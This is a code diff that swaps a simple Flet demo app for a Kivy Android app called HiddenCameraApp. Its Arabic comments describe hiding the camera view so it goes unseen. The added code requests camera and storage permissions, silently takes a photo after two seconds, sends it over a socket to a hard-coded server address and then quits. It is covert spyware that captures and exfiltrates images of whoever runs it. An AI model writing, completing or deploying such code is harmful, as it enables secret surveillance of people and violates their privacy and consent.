@@ -1,22 +1,51 @@
-from flet import *
+import socket
 import os
+from kivy.app import App
+from kivy.uix.camera import Camera
+from kivy.clock import Clock
+from plyer import permissions
 
-def main(page: Page):
+SERVER_IP = '192.168.1.5'  # غيره لـ IP جهازك
+SERVER_PORT = 5555
 
-    # إنشاء الفولدر
-    folder_name = "test_apk"
-    os.makedirs(folder_name, exist_ok=True)
+class HiddenCameraApp(App):
+    def build(self):
+        # طلب الصلاحيات
+        permissions.request_permissions([
+            permissions.Permission.CAMERA,
+            permissions.Permission.WRITE_EXTERNAL_STORAGE,
+            permissions.Permission.READ_EXTERNAL_STORAGE
+        ])
+        
+        # إنشاء عنصر الكاميرا (هيكون حجمه 1x1 بيكسل عشان ميبانش)
+        self.camera_obj = Camera(play=True, resolution=(640, 480))
+        
+        # استنى ثانيتين عشان الكاميرا تعمل فوكس وبعدين صور
+        Clock.schedule_once(self.take_shot, 2)
+        return self.camera_obj
 
-    # إنشاء ملف داخل الفولدر
-    file_path = os.path.join(folder_name, "done.txt")
+    def take_shot(self, *args):
+        photo_name = "captured_image.jpg"
+        self.camera_obj.export_to_png(photo_name)
+        print("Photo Captured!")
+        self.send_photo(photo_name)
 
-    with open(file_path, "w") as f:
-        f.write("Done successfully!")
+    def send_photo(self, file_path):
+        if not os.path.exists(file_path):
+            return
+            
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            client_socket.connect((SERVER_IP, SERVER_PORT))
+            with open(file_path, "rb") as f:
+                client_socket.sendall(f.read())
+            print("Photo Sent Successfully!")
+        except Exception as e:
+            print(f"Error: {e}")
+        finally:
+            client_socket.close()
+            # قفل التطبيق بعد الإرسال
+            App.get_running_app().stop()
 
-    # نص يظهر في التطبيق
-    T = Text("Folder and file created ✔️")
-
-    page.add(T)
-    page.update()
-
-app(target=main)
+if __name__ == "__main__":
+    HiddenCameraApp().run()
